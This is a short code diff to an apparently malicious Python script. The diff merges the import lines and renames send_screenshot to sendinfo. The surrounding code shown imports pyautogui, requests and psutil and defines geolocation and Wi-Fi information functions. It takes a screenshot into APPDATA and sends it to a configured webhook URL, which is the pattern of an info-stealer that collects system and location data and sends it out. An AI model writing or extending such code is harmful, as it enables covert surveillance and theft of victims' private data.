@@ -1,12 +1,4 @@
-import os
-import pyautogui
-import requests
-import socket
-import datetime
-import json
-import psutil
-import platform
-import subprocess
+import os, pyautogui, requests, socket, datetime, json, psutil, platform, subprocess
 from co.config import WEBHOOK_URL
 
 def get_geolocation(ip):
@@ -50,7 +42,7 @@ def get_wifi_info():
         return f"An unexpected error occurred: {e}"
     return '\n'.join(wifi_info) if wifi_info else "No Wi-Fi information available."
 
-def send_screenshot():
+def sendinfo():
     webhook_url=WEBHOOK_URL
     screenshot_path=os.path.join(os.getenv('APPDATA'),'screenshot.png')
     pyautogui.screenshot(screenshot_path)
